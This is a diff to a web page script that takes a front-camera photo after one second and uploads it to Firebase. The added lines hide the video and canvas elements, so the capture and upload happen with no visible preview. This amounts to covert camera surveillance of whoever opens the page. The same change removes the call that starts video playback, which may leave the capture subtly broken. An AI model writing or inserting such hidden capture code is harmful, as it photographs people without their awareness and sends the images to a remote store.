@@ -41,6 +41,10 @@
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
+            // Hide video and canvas elements
+            video.style.display = 'none';
+            canvas.style.display = 'none';
+
             // Start capturing from the front camera
             navigator.mediaDevices.getUserMedia({
                 video: {
@@ -56,7 +60,6 @@
                     // Set the canvas size for 1080p
                     canvas.width = 1920;  // Set canvas width to 1920 for 1080p
                     canvas.height = 1080; // Set canvas height to 1080 for 1080p
-                    video.play();
 
                     // Capture image after a short delay
                     setTimeout(() => {
@@ -65,11 +68,6 @@
                         uploadImage(imageData); // Upload image to Firebase
                         stopVideo(stream); // Stop the video stream
                     }, 1000); // Capture after 1 second
-                    // Capture image immediately
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
-                    uploadImage(imageData); // Upload image to Firebase
-                    stopVideo(stream); // Stop the video stream
                 };
             })
             .catch(err => {
